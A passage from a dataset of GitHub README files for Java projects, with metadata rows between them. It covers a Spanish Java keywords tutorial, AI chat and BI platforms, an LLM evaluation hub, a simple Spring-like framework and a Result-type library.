 <img src=""./final-proyect/001.png"" alt=""sql"" width=""600""/>
  <img src=""./final-proyect/002.png"" alt=""sql"" width=""600""/>
   <img src=""./final-proyect/003.png"" alt=""sql"" width=""600""/>
    <img src=""./final-proyect/004.png"" alt=""sql"" width=""600""/>
     <img src=""./final-proyect/005.png"" alt=""sql"" width=""600""/>
      <img src=""./final-proyect/006.png"" alt=""sql"" width=""600""/>

</p>


----

## Tips Importantes:

Exploraremos conceptos fundamentales en Java que son esenciales para comprender y escribir programas efectivos. Estos conceptos son básicos pero críticos para cualquier estudiante de Java, ya que forman la base sobre la cual se construyen programas más complejos y sofisticados. Los términos que abordaremos incluyen public, static, void, private y más. Comencemos desglosando cada uno de estos términos.

1. public
 es un modificador de acceso que se aplica a clases, métodos y variables. Cuando un miembro de una clase se declara como public, está disponible para su acceso desde cualquier otra clase. Es decir, se puede acceder a él desde fuera de la clase donde está definido.

Ejemplo:
```
public class MiClase {
    public int miVariablePublica;
    public void miMetodoPublico() {
        // Código del método
    }
}
```

2. private
 es otro modificador de acceso. Cuando un miembro de una clase se declara como private, solo es accesible dentro de la misma clase. Esto significa que otros objetos o clases no pueden acceder directamente a este miembro.

Ejemplo:
```
public class MiClase {
    private int miVariablePrivada;
    private void miMetodoPrivado() {
        // Código del método
    }
}
```

3. static
 es una palabra clave utilizada para crear campos o métodos que pertenecen a la clase en sí, en lugar de pertenecer a instancias individuales de la clase. Los miembros static se pueden acceder sin la necesidad de crear una instancia de la clase.

Ejemplo:
```
public class MiClase {
    public static int miVariableEstatica;
    public static void miMetodoEstatico() {
        // Código del método
    }
}
```

4. void
 es una palabra clave utilizada para indicar que un método no devuelve ningún valor. Cuando un método tiene un tipo de retorno void, significa que el método realiza ciertas acciones pero no devuelve ningún valor al llamador.

Ejemplo:
```
public class MiClase {
    public void metodoQueNoDevuelveNada() {
        // Código del método
    }
}
```

5. main
 es el punto de entrada para la ejecución de un programa Java. Es el método que se ejecuta cuando se inicia un programa Java y su firma debe ser exactamente como sigue:


```
public static void main(String[] args)
```
Aquí, public indica que el método es accesible desde cualquier otra clase, static indica que el método pertenece a la clase en sí y no a instancias individuales de la clase, void indica que el método no devuelve ningún valor y String[] args es un parámetro que permite pasar argumentos al programa.

Estos conceptos son fundamentales en Java y proporcionan la base para comprender cómo se estructuran y comportan los programas en este lenguaje de programación. Dominar estos conceptos es esencial para cualquier estudiante de Java que desee escribir programas eficientes y bien estructurados.

6. class
 es una palabra clave utilizada para definir una nueva clase en Java. Una clase es un plano, una plantilla o un molde a partir del cual se pueden crear objetos. Define las propiedades (campos) y comportamientos (métodos) comunes a todos los objetos de ese tipo.

Ejemplo:
```
public class MiClase {
    // Campos y métodos de la clase
}
```

7. new
 es una palabra clave utilizada para crear una nueva instancia de una clase. Reserva memoria para el nuevo objeto y llama al constructor de la clase para inicializarlo.

Ejemplo:
```
MiClase objeto = new MiClase();
```

8. return
 es una palabra clave utilizada dentro de un método para devolver un valor al código que llamó al método. Marca el final del método y puede devolver un valor del tipo especificado en la firma del método, si corresponde.

Ejemplo:
```
public int sumar(int a, int b) {
    return a + b;
}
```

9. this
 es una palabra clave que se refiere a la instancia actual de la clase. Se utiliza para diferenciar entre los campos de la clase y los parámetros de los métodos o constructores cuando tienen el mismo nombre.

Ejemplo:
```
public class Persona {
    private String nombre;
    
    public Persona(String nombre) {
        this.nombre = nombre;
    }
}
```

10. final
 es una palabra clave que se puede aplicar a una clase, método o variable. Cuando se aplica a una clase, indica que la clase no puede ser subclaseada. Cuando se aplica a un método, indica que el método no puede ser sobrescrito. Cuando se aplica a una variable, indica que su valor no puede cambiar después de la inicialización.

Ejemplo:
```
public final class MiClaseFinal {
    // Contenido de la clase
}

public class OtraClase {
    public final void metodoFinal() {
        // Código del método
    }
}

public class Ejemplo {
    public final int VALOR = 10;
}
```

11. protected
El modificador protected permite el acceso al miembro al que se aplica desde otras clases en el mismo paquete y también desde subclases, independientemente de si están en el mismo paquete o no.

Ejemplo:
```
public class MiClase {
    protected int miVariableProtegida;
    protected void miMetodoProtegido() {
        // Código del método
    }
}
```

12. default (o sin modificador)
Si no se especifica ningún modificador (también conocido como ""modificador de paquete""), el miembro es accesible solo dentro del mismo paquete. Esto significa que cualquier clase dentro del mismo paquete puede acceder al miembro, pero las clases fuera del paquete no pueden.

Ejemplo:

```
class MiClase {
    int miVariableDePaquete;
    void miMetodoDePaquete() {
        // Código del método
    }
}
```


----
## Datos interesantes:

### application.properties en Spring Boot:

El archivo application.properties es un archivo de configuración en Spring Boot que se utiliza para definir propiedades específicas de la aplicación. Aquí puedes configurar cosas como la base de datos que la aplicación utilizará, el puerto en el que se ejecutará la aplicación, configuraciones de seguridad, entre otras. Es una forma de personalizar el comportamiento de tu aplicación sin necesidad de cambiar el código fuente.

### JPA (Java Persistence API):

JPA es una API de Java que proporciona un conjunto de especificaciones para trabajar con bases de datos relacionales en aplicaciones Java. Permite a los desarrolladores mapear objetos Java a tablas en una base de datos relacional y viceversa, simplificando el proceso de interactuar con la base de datos. Con JPA, puedes realizar operaciones CRUD (Crear, Leer, Actualizar y Eliminar) en la base de datos de manera más sencilla y utilizando objetos Java.

### Hibernate:

Hibernate es un framework de mapeo objeto-relacional (ORM) para Java. Se utiliza comúnmente junto con JPA para implementar las especificaciones de JPA de manera eficiente. Hibernate simplifica el desarrollo de aplicaciones Java al proporcionar una capa de abstracción sobre la base de datos subyacente, permitiendo a los desarrolladores interactuar con la base de datos utilizando objetos Java en lugar de consultas SQL directas. Esto hace que el desarrollo de aplicaciones que requieren acceso a bases de datos sea más rápido y menos propenso a errores.


### En resumen: 

Mientras que JPA es una especificación estándar para mapear objetos Java a bases de datos relacionales, Hibernate es una implementación popular de esta especificación que simplifica el desarrollo de aplicaciones Java al proporcionar funcionalidades ORM.


## Profesor: Alejandro Daniel Di Stefano
",0,0,1,mit,0.0
apple/pkl-spring,main,,2,2,3,apache-2.0,4.0
Enndfp/short-link,main,,0,0,1,mit,0.0
ageerle/ruoyi-ai,main,"## 平台简介

> 基于ruoyi-plus实现AI聊天和绘画功能-后端

> 本项目完全开源免费！
后台管理界面使用elementUI服务端使用Java17+SpringBoot3.X

实现功能
1. 支持ChatGPT4,Dall-E-3,ChatGPT-4-All,GPTS 模型
2. 支持语音克隆
3. 支持文生图模型
4. 支持微信小程序
5. 支持个人二维码实时到账(易支付)
6. 支持个人微信接入ChatGPT
> 
>项目地址
<ul>
<li>小程序端: https://github.com/ageerle/ruoyi-uniapp</li>
<li>前端-后台管理: https://github.com/ageerle/ruoyi-admin</li>
<li>前端-用户端: https://github.com/ageerle/ruoyi-web</li>
<li>演示地址: https://web.pandarobot.chat</li>
</ul>

## 小程序演示
<div>
  <img style=""margin:10px"" src=""./image/03.png"" alt=""drawing"" width=""300px"" height=""400px""/>
  <img style=""margin:10px"" src=""./image/04.png"" alt=""drawing"" width=""300px"" height=""400px""/>
</div>

## H5演示
<div>
  <img style=""margin:10px"" src=""./image/05.png"" alt=""drawing"" width=""300px"" height=""400px""/>
  <img style=""margin:10px"" src=""./image/06.png"" alt=""drawing"" width=""300px"" height=""400px""/>
</div>

## PC端演示
<div>
  <img style=""margin-top:10px"" src=""./image/07.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px"" src=""./image/08.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## MJ绘图
<div>
  <img style=""margin-top:10px"" src=""./image/10.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px"" src=""./image/11.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## 私有知识库管理
<div>
  <img style=""margin-top:10px;width:50%"" src=""./image/12.png"" alt=""drawing"" width=""550px"" height=""300px""/>
  <img style=""margin-top:10px;width:50%"" src=""./image/私有知识库业务架构图.drawio.png"" alt=""drawing"" width=""550px"" height=""300px""/>
</div>

## 进群学习
<div>
  <img src=""./image/01.png"" alt=""drawing"" width=""300px"" height=""300px""/>
</div>

## 参考项目
<ol>
<li>https://github.com/Grt1228/chatgpt-java</li>
<li>https://github.com/Dooy/chatgpt-web-midjourn
",0,4,1,mit,0.0
joshlong/bootiful-spring-boot-2024,main,,0,1,2,apache-2.0,1.0
Enndfp/simple-framework,main,"<img src=""https://img.enndfp.cn/202401181958108.png"" style=""zoom:80%;""/>

**简体中文** | [English](README-EN.md) 

<div align=""center"">
<h1>🌟 SimpleFramework</h1>
</div>

<div align=""center"">
<b>🛠️ 造轮子项目：从头实现Spring框架</b>
</div>
<div align=""center"">
<img src=""https://img.shields.io/badge/Java-1.8-orange""/>
<img src=""https://img.shields.io/badge/CGLIB-3.3.0-green""/>
<img src=""https://img.shields.io/badge/AspectJWeaver-1.9.5-yellowgreen""/>
<img src=""https://img.shields.io/badge/javax.servlet.jsp--api-2.3.3-blue""/>
<img src=""https://img.shields.io/badge/javax.servlet--api-4.0.1-lightgrey""/>
<img src=""https://img.shields.io/badge/Gson-2.8.6-yellow""/>
<img src=""https://img.shields.io/badge/Slf4j--log4j12-1.7.28-yellow""/>
<img src=""https://img.shields.io/badge/Lombok-1.18.30-blue""/>
</div>



## 📖 项目简介

> Spring框架在Java开发界占据了举足轻重的地位，这主要归功于其易于理解和功能强大的特性。它广泛应用了多种设计模式，为项目提供了规范化的架构。更重要的是，Spring作为一个开源框架，为广大开发者提供了学习和提升的机会，为Java开发带来了一种革新的春风。
>
> 鉴于Spring的这些优势，很多Java开发者渴望使用基础技术来实现一个类似于Spring的框架。这种做法不仅是对Spring架构和设计理念的深入理解，也是一种技术能力的展示。因此，“simple-framework”项目应运而生，旨在通过实现一个简化版的Spring框架，使开发者更容易地理解其核心概念，同时也能够提升自己在Java开发领域的技术水平。

**Simple-Framework是一个免费的开源项目，面向所有个人和企业，提供易于使用和学习的Java开发框架，支持开发者社区的共同进步与创新。**

## 🚀 技术亮点

- **Java 1.8**: 提供优化的性能和稳定性，是Java开发的基石。
- **CGLIB 3.3.0 & AspectJWeaver 1.9.5**: 强大的库，为AOP提供了坚实的基础。
- **Java Servlet API & Gson & Lombok**: 这些技术共同构成了一个强大的Web应用开发环境。

## 📚 项目架构图

### 🔄 IOC

![image-20240118205412786](https://img.enndfp.cn/202401182054883.png)

### 🔀 AOP

![image-20240119133233090](https://img.enndfp.cn/202401191332233.png)

### 🕸️ MVC

![image-20240119142136722](https://img.enndfp.cn/202401191421810.png)

## ✨ 主要功能

本项目是一个**简易版本的Spring框架**，实现了Spring框架的三大核心功能：**IOC**（控制反转）、**AOP**（面向切面编程）和**MVC**（模型-视图-控制器），并将其分为以下核心包：

#### 📦 Core包

**功能**: Core包实现了框架的**核心功能**，包括**Bean的扫描加载**、**容器的维护**、**单例模式的实现**，以及**自定义Bean的处理**。

**实现方式**: 利用**Java反射机制**动态扫描和加载指定包下的类，识别并处理不同类型的注解（如 `@Component`, `@Controller` 等）以管理不同种类的Bean。同时，它实现了**单例模式**，确保每个Bean只被实例化一次，并提供了操作Bean的基本方法，例如添加、获取和管理Bean实例。

#### 💉 Inject包

**功能**: Inject包负责**依赖注入**，包括处理 `@Autowired` 注解，实现**单例模式下的依赖注入**，以及为**接口注入实现类**。

**实现方式**: 通过**Java反射机制**扫描Bean的字段，查找带有 `@Autowired` 注解的字段，并利用Bean容器获取并注入所需依赖。它支持单例模式下的依赖注入，确保依赖的一致性和唯一性。同时，它也能为接口动态地注入适当的实现类，提高了代码的灵活性和可维护性。

#### 🔍 AOP包

**功能**: AOP包遵循**面向切面编程思想**，使用 `Aspect` 和 `Order` 注解来标识和排序切面类，通过**CGlib动态代理**和**AspectJWeaver**实现横切逻辑的织入，动态修改方法逻辑。

**实现方式**: 利用**CGlib**创建目标类的代理，并通过实现 `MethodInterceptor` 接口来拦截方法调用。这允许在方法执行前后执行切面逻辑（如日志记录、权限检查等）。同时，通过**AspectJ**的表达式语言提供对被代理类更精细的控制，使得可以根据不同的需要对方法逻辑进行修改和增强。

#### 🌐 MVC包

**功能**: MVC包处理**请求分发相关功能**，包括重构 `DispatcherServlet`，实现 `RequestProcessorChain` 和 `RequestProcessor` 矩阵，以及 `ResultRender` 矩阵，完成多种请求的处理与响应渲染。

**实现方式**: 通过 `DispatcherServlet` 作为**中心控制器**，处理所有的HTTP请求并将其分发到相应的处理器。利用 `RequestProcessorChain` 管理和执行一系列请求处理器，以处理不同类型的请求（如静态资源、控制器方法等）。`ResultRender` 矩阵负责根据处理结果选择合适的渲染策略，例如渲染HTML页面或返回JSON数据，确保响应正确地渲染和返回给客户端。

## 💡 快速上手指南

要开始使用 **SimpleFramework**，您可以采取以下步骤：

### 📥 方法一：源码使用

1. 克隆仓库：

   ```bash
   git clone https://github.com/Enndfp/simple-framework.git
   ```

2. 导入项目到您的IDE（例如IntelliJ IDEA）。

3. 在 `demo` 目录下进行相关测试。这与使用Spring Boot开发项目类似。

### 📦 方法二：War包部署

1. 构建项目并生成War包。
2. 将War包部署到您的Servlet容器中，如Apache Tomcat。
3. 启动容器，应用将自动部署。

### 🌟 示例代码

以下是一个简单的示例，展示了如何在您的项目中使用 **SimpleFramework**：

```java
import com.simpleframework.core.BeanContainer;

public class MyApplication {
    public static void main(String[] args) {
        // 初始化容器
        BeanContainer container = BeanContainer.getInstance();
        container.loadBeans(""com.yourpackage"");

        // 使用容器获取Bean
        MyService myService = (MyService) container.getBean(MyService.class);
        myService.doSomething();
    }
}
```

在这个例子中，我们首先获取了 `BeanContainer` 的实例，然后加载了指定包路径下的所有Bean。之后，我们从容器中获取了 `MyService` 类的实例，并调用了其方法。
",0,0,1,mit,0.0
xielong/ai-hub,main,"# AI Hub Project

## 简介

AI Hub旨在持续测试和评估主流大型语言模型，同时积累和管理各种有效的模型调用提示（prompt）。目前，AI Hub已接入国内所有主流的大型语言模型，包括文心一言、腾讯混元、智谱AI、MiniMax、百川智能等，并计划持续追踪、接入和评估新模型。

已支持模型列表：
1. OpenAI / gpt-4-turbo
2. OpenAI / gpt-3.5-turbo
3. Baidu / ERNIE-Bot-4（文心一言4）
4. Baidu / ERNIE-Bot-turbo（文心一言）
5. Zhipu / glm-4（智谱GLM-4）
6. Zhipu / chatGLM_turbo（智谱chatGLM）
7. Ali / qwen-plus（通义千问plus）
8. Ali / qwen-turbo（通义千问）
9. Tencent / ChatPro（腾讯混元）
10. Tencent / ChatStd（腾讯混元）
11. Tencent / hunyuan-lite（腾讯混元)
12. Baichuan / Baichuan2-Turbo（百川）
13. Minimax / abab5.5-chat（MiniMax）
14. Minimax / abab6-chat（MiniMax）
15. Xunfei / Spark3.1（讯飞星火）
16. Moonshot / moonshot-v1-8k (月之暗面)
17. Xunfei / Spark3.5 (讯飞星火3.5)
18. ByteDance / Skylark-chat (字节豆包)
19. Lingyi / yi-34b-chat-0205 (零一万物)
20. Lingyi / yi-34b-chat-200k (零一万物)
21. Lingyi / yi-vl-plus (零一万物)
22. Deepseek / DeepSeek-V2 (Deepseek)
23. Baidu / ERNIE-Lite-8K（文心一言）
24. Baidu / ERNIE-Speed-8K（文心一言）
25. Xunfei / Spark-Lite（讯飞星火）

在 [大模型列表](#大模型列表) 部分，有更完整的大语言模型列表。请注意，其中的一些大语言模型尚未经过评估，我将陆续对这些模型进行评估。


![chat-demo](assets/chat-demo.png)

使用前请在 Settings 页面设置模型的 credentials：
![settings](assets/settings.png)

## 评估结果
### 英文翻译
[测试用例看这里](docs/use_cases/translation/)
![英文翻译](assets/assess_translation.png)

### 编程
[测试用例看这里](docs/use_cases/coding/)
![英文翻译](assets/assess_coding.png)

### 指令输出
[测试用例看这里](docs/use_cases/instruction/)
![英文翻译](assets/assess_instruction.png)


## 大模型接入
如果你想自己接入列表中的大模型，可以通过以下方式。
### Rest 服务
启动 ai-hub-server，访问
```http
http://127.0.0.1:3000/api/v1/models/${provider}/${model}:chat
```
Post:
```json
{
    ""input"": ""${input}""
}
```
### Java 代码接入
可以参考[这里](ai-hub-server/src/main/java/com/github/xielong/aihub/adapter)
```java
@Service
public class AIModelInvokerFactory {

    private final ApplicationContext context;

    @Autowired
    public AIModelInvokerFactory(ApplicationContext context) {
        this.context = context;
    }

    public AIModelInvoker getProviderAdapter(String providerName) {
        AIProvider provider = AIProvider.fromName(providerName);

        switch (provider) {
            case OPENAI:
                return context.getBean(OpenAIInvoker.class);
            case BAICHUAN:
                return context.getBean(BaichuanInvoker.class);
            case ALI:
                return context.getBean(AliInvoker.class);
            case BAIDU:
                return context.getBean(BaiduInvoker.class);
            case ZHIPU:
                return context.getBean(ZhipuInvoker.class);
            case TENCENT:
                return context.getBean(TencentInvoker.class);
            case XUNFEI:
                return context.getBean(XunfeiInvoker.class);
            case MINIMAX:
                return context.getBean(MiniMaxInvoker.class);
            default:
                throw new IllegalArgumentException(""Unknown provider: "" + provider);
        }
    }

}

```

## 运行

### Docker
推荐使用 docker-compose 启动服务
```shell
cd docker
docker-compose up -d
```

### 数据库
参考[脚本](docker/init-db/init.sql)

### 前端
```shell
cd ai-hub-fe
npm run start
```

### 服务端
需要 JDK 11 以上版本
```shell
cd ai-hub-server
mvn clean package
java -jar ai-hub-server-1.0.0-SNAPSHOT-exec.jar
```

## 测试集

### [翻译](docs/use_cases/translation/)
### [编程](docs/use_cases/coding/)
### z-bench 测试集

## 大模型列表

### 低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Baidu     | ERNIE Speed    | 免费                | 8k             |
| Baidu     | ERNIE Lite     | 免费                | 8k             |
| Tencent   | hunyuan-lite   | 免费                | 256k           |
| ByteDance | Doubao-lite    | Input: 0.3 \| Output: 0.6 | 32k     |
| Zhipu     | GLM-3-Turbo    | 1                   | 128k           |
| Lingyi    | yi-spark       | 1                   | 16k            |
| Ali       | qwen-long      | Input: 0.5 \| Output: 2 | 10m      |
| ByteDance | Doubao-pro     | Input: 0.8 \| Output: 2 | 32k     |
| DeepSeek  | deepseek-chat  | Input: 1 \| Output: 2  | 32k     |
| Lingyi    | yi-medium      | 2.5                 | 16k            |

### 中低成本模型

| Company   | Model          | Price(1M tokens)    | Context Length |
|-----------|----------------|---------------------|----------------|
| Ali       | qwen-turbo     | Input: 2 \| Output: 6  | 8k          |
| Tencent   | hunyuan-standard | Input: 4.5 \| Output: 5 | 32k    |
| MiniMax   | abab5.5s       | 5                   | 8k             |
| OpenAI    | GPT-3.5 Turbo  | Input: $0.50 \| Output: $1.50 | 16k |
| ByteDance | Doubao-pro-128k | Input: 5 \| Output: 9 | 128k   |
| Baichuan  | Baichuan2-Turbo | 8                  | 32k            |
| MiniMax   | abab6.5s       | 10                  | 245k           |
| Ali       | qwen-plus      | Input: 4 \| Output: 12 | 32k     |
| Baidu     | ERNIE 3.0      | 12                  | 8k             |
| Baichuan  | Baichuan3-Turbo | 12                 | 32k            |
| Lingyi    | yi-large-turbo | 12                  | 16k            |
| Lingyi    | yi-medium-200k | 12                  | 200k           |
| Moonshot  | moonshot-v1-8k | 12                  | 8k             |

### 中高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| Moonshot  | moonshot-v1-32k    | 24                  | 32k            |
| Baichuan  | Baichuan3-Turbo-128k | 24                | 128k           |
| MiniMax   | abab6.5            | 30                  | 8k             |
| Tencent   | hunyuan-standard-256k | Input: 15 \| Output: 60 | 256k |
| Moonshot  | moonshot-v1-128k   | 60                  | 128k           |

### 高成本模型

| Company   | Model              | Price(1M tokens)    | Context Length |
|-----------|--------------------|---------------------|----------------|
| OpenAI    | GPT-4o             | Input: $5 \| Output: $15 | 128k     |
| Baidu     | ERNIE-3.5-128k     | Input: 48 \| Output: 96 | 128k     |
| Tencent   | hunyuan-pro        | Input: 30 \| Output: 100 | 32k     |
| Ali       | qwen-max           | Input: 40 \| Output: 120 | 8k      |
| Zhipu     | GLM-4              | 100                 | 128k           |
| Baichuan  | Baichuan4          | 100                 | 32k            |
| Baidu     | ERNIE 4.0          | 120                 | 8k             |",0,1,1,apache-2.0,0.0
kora-projects/kora,master,"# Kora Framework

[![Maven Central](https://maven-badges.herokuapp.com/maven-central/ru.tinkoff.kora/common/badge.svg)](https://maven-badges.herokuapp.com/maven-central/ru.tinkoff.kora/common)
[![GitHub Action](https://github.com/kora-projects/kora/workflows/Build%20Master/badge.svg)](https://github.com/kora-projects/kora/actions?query=workflow%3A%22Build%20Master%22++)

Kora - полнофункциональный фреймворк общего назначения для написания серверных Java / Kotlin приложений с упором на Производительность, Эффективность, Прозрачность.
Kora стремится предоставить достаточно высокоуровневые декларативные инструменты и абстракции для разработчиков,
которые на этапе компиляции преобразуются в производительный для железа и понятный для человека код. [Хотите знать больше?](https://kora-projects.github.io/kora-docs/ru/)

---

Kora is a full-stack framework for writing Java / Kotlin server-side applications with a focus on Performance, Efficiency, Transparency.
Kora aims to provide sufficiently high-level declarative tools and abstractions for developers,
which at compile time are translated into hardware-performant and human-readable code. [Would you like to know more?](https://kora-projects.github.io/kora-docs/en/)
",16,2,9,apache-2.0,175.0
change-everything/nexura-next-bi,master,"![logo.png](next-bi-backend%2Fimage%2Flogo.png)

# next BI
## 项目介绍

基于 Spring Boot + MQ + AIGC + React的智能数据分析平台。区别于传统 BI，用户只需要导入原始数据集、并输入分析诉求，就能自动生成可视化图表及分析结论，实现数据分析的降本增效。

## 流程图
![流程图.png](next-bi-backend%2Fimage%2F%E6%B5%81%E7%A8%8B%E5%9B%BE.png)


## 项目亮点

### 1. 智能数据分析流程：

- 后端通过自定义Prompt预设模板，封装用户输入的数据和分析诉求。
- 通过AIGC接口生成可视化图表的JSON配置和分析结论，返回给前端进行渲染。

### 2. Excel文件处理优化：

- 由于AIGC的输入Token限制，采用Easy Excel解析用户上传的XLSX表格数据文件并压缩为CSV格式。
- 实测结果显示，此优化提高了单次输入数据量约20%，同时也实现了成本的有效节约。

### 3. 安全性增强：

- 对用户上传的原始数据文件进行多重校验，包括后缀名、大小、内容等，以确保系统的安全性。
- 利用Easy Excel解析成功的文件基本可以确认其内容的合法性。

### 4. 分布式限流与资源控制：

- 基于Redisson的RateLimiter实现分布式限流，控制单用户访问频率，防止恶意占用系统资源。

### 5. 数据存储与查询性能优化：

- 使用MyBatis + 业务层构建自定义SQL，实现对每份原始数据的分表存储，提高查询性能和系统的可扩展性。
- 数据分表存储提高了查询灵活性，同时带来了性能的显著提升。

### 6. 异步化任务处理：

- 基于自定义的IO密集型线程池和任务队列，实现AIGC的并发执行和异步化。
- 提交任务后即可响应前端，大幅度提高用户体验，支持更多用户排队而不是给系统无限压力导致提交失败。

### 7. 消息队列和可靠性提升：

- 引入RabbitMQ分布式消息队列，用于接收和持久化任务消息。
- 通过Direct交换机转发给解耦的AI生成模块消费，提高系统的可靠性，确保任务的可靠处理。

## 优化和增强

### 1. 数据处理进一步优化：

- 利用AI进一步整理和压缩原始数据，提高输入的数据数量和质量。

### 2. 系统资源控制：

- 限制用户同时生成图表的数量，防止单个用户抢占系统资源。

### 3. 用户统计和积分系统：

- 统计用户生成图表的次数，考虑添加积分系统，用户可以消耗积分进行智能分析。

### 4. 缓存优化：

- 由于图表数据是静态的，考虑使用Redis缓存来提高加载速度。

### 5. 异常处理和重试机制：

- 使用死信队列处理异常情况，将图表生成任务置为失败。
- 为任务的执行增加Guava Retrying重试机制，保证系统的可靠性和稳定性。

### 6. 超时控制和反向压力：

- 为任务的执行增加超时时间，超时自动标记为失败，提高系统稳定性。
- 考虑根据调用的服务状态来选择当前系统的策略，实现反向压力控制。

### 7. 实时消息通知：

- 实现任务执行成功或失败后，通过WebSocket或Server-Sent Events给用户发送实时消息通知，提高用户体验。



## 截图
![login.png](next-bi-backend%2Fimage%2Flogin.png)
![index.png](next-bi-backend%2Fimage%2Findex.png)
![fill_index.png](next-bi-backend%2Fimage%2Ffill_index.png)
![success.png](next-bi-backend%2Fimage%2Fsuccess.png)
![sse.png](next-bi-backend%2Fimage%2Fsse.png)
![mychart.png](next-bi-backend%2Fimage%2Fmychart.png)
![detail.png](next-bi-backend%2Fimage%2Fdetail.png)
![wait.png](next-bi-backend%2Fimage%2Fwait.png)
![running.png](next-bi-backend%2Fimage%2Frunning.png)
![failed.png](next-bi-backend%2Fimage%2Ffailed.png)


## 部署流程
部署流程日后更新，请关注。。。

## 技术栈


![Static Badge](https://img.shields.io/badge/AIGC-blue)
![Static Badge](https://img.shields.io/badge/Spring%20Boot-green)
![Static Badge](https://img.shields.io/badge/RabbitMQ-orange)
![Static Badge](https://img.shields.io/badge/Redis-red)
![Static Badge](https://img.shields.io/badge/React-skyblue)
![Static Badge](https://img.shields.io/badge/Guava%20Retrying-gray)
![Static Badge](https://img.shields.io/badge/Server%20Sent%20Events-black)
...


## 作者

- [@peiYp](https://github.com/change-everything)


## 反馈

如果你有任何反馈，请联系我：pyptsguas@163.com

",1,0,1,apache-2.0,0.0
sviperll/result4j,main,"Result-type for Java
====================

The project provides Result-type similar to Result-type in Rust that
allows to return either successfull result or otherwise some kind of error.

In Java, the native way of reporting errors are exceptions, either checked or unchecked.
You do not need Result-type most of the time in Java-code, where
you can directly throw exceptions.
But there are situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.
Result-type and associated helper-classes help with exception handling and
allow to write idiomatic functional code that can interact with methods that throw exceptions.

Result-type provides a way to pass error enformation as a first-class value through
the code written in functional style.
Routines are provided for interoperability of normal code that uses exception and
functional code that uses Result-type, so that exceptions can be caught and propagated as
errors in Result-type and then rethrown again later in the control-flow.

Getting Started
---------------

result4j
[is available in Maven Central](https://central.sonatype.com/artifact/com.github.sviperll/result4j).

````
        <dependency>
            <groupId>com.github.sviperll</groupId>
            <artifactId>result4j</artifactId>
            <version>1.0</version>
        </dependency>
````

Overview
--------

[API Documentation is available for reference](https://www.javadoc.io/doc/com.github.sviperll/result4j).

Result type can be either a successful result or some kind of error.

````java
Result<String, E> suc = Result.success(""Hello, World!"");
````

The above line declares successful result value.

````java
Result<String, Integer> err = Result.error(404);
````

The above line declares error-value.

````java
Result<String, Integer> result = ...;
switch (result) {
    case Result.Success<String, Integer>(String value) -> System.out.println(value);
    case Result.Error<String, Integer>(Integer code) ->
            throw new IOException(""%s: error"".formatted(code));
}
````

Pattern matching can be used to check unknown result value as shown above.

````java
Result<String, Integer> receivedResult = ...;
String value = receivedResult.throwError(code -> new IOException(""%s: error"".formatted(code)));
System.out.println(value);
````

Instead of a low-level pattern-matching,
higher level helper-methods are available in `Result`-class.
In the snippet above `throwError` is used to throw exception when `Result` contains error.

Result-type is created for interoperability between normal Java-code that throws exception and
more functional code.

````java
Catcher.ForFunctions<IOException> io =
    Catcher.of(IOException.class).forFunctions();
String concatenation =
        Stream.of(""a.txt"", ""b.txt"", ""c.txt"")
                .map(io.catching(name -> loadResource(name)))
                .collect(ResultCollectors.toSingleResult(Collectors.join()))
                .throwError(Function.identity());
````

Above code uses `Catcher` class to adapt functions that
throw exceptions to return Result-type instead.
`ResultCollectors` class contains helper-methods to collect multiple `Result`s into a single one.
You do not need `Catcher` class in normal Java-code, where you can directly throw exceptions.
But the above snippet can serve as an example of situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.

````java
class MyMain {
    String loadResource(String name) throws IOException {
        // ...
    }

    void main(String[] args) throws IOException {
        Catcher.ForFunctions<IOException> io =
            Catcher.of(IOException.class).forFunctions();
        Function<String, Result<String, IOException>> f = io.catching(MyMain::loadResult);
        Result<String, IOException> result = f.apply(""my-resource"");
        String value = result.throwError(Function.identity());
        System.out.println(value);
    }
}
````

The example above shows the usage of the `catching` method of the `Catcher` class, that
allows to adapt exception throwing method and instead to have a method that returns `Result` with
exception representing as an error-value.

There is also an `AdaptingCatcher` class that allows to adapt or wrap exceptions.

````java
AdaptingCatcher.ForFunctions<IOException, PipelineException> io =
        Catcher.of(IOException.class).map(PipelineException::new).forFunctions();
AdaptingCatcher.ForFunctions<MLException, PipelineException> ml =
        Catcher.of(MLException.class).map(PipelineException::new).forFunctions();
List<Animal> animals1 =
        List.of(""cat.jpg"", ""dog.jpg"")
                .stream()
                .map(io.catching(Fakes::readFile))
                .map(Result.flatMapping(ml.catching(Fakes::recognizeImage)))
                .collect(ResultCollectors.toSingleResult(Collectors.toList()))
                .throwError(Function.identity());
Assertions.assertEquals(List.of(Animal.CAT, Animal.DOG), animals1);
````
",0,0,1,apache-2.0,0.0
wch2019/xiaohai-blog,dev,"## DotCode(点码）

<p align=center>
  <a href=""https://gitee.com/wch2019/xiaohai-blog"">
    <img src=""doc/docs/image/favicon.ico"" alt=""DotCode"" style=""border-radius: 50%"">
  </a>
</p>

<p align=""center"">
   <a target=""_blank"" href=""https://github.com/wch2019"">
      <img src=""https://img.shields.io/hexpm/l/plug.svg""/>
      <img src=""https://img.shields.io/badge/JDK-17+-green.svg""/>
      <img src=""https://img.shields.io/badge/springboot-2.7.7-green""/>
      <img src=""https://img.shields.io/badge/vue-2.6.10-green""/>
      <img src=""https://img.shields.io/badge/mysql-8.0+-green""/>
      <img src=""https://img.shields.io/badge/mybatis--plus-3.5.3.1-green""/>
      <img src=""https://img.shields.io/badge/redis-6.0.5-green""/>
   </a>
</p>
<img src=""./doc/docs/image/web/editCenter.png""/>

## 前言

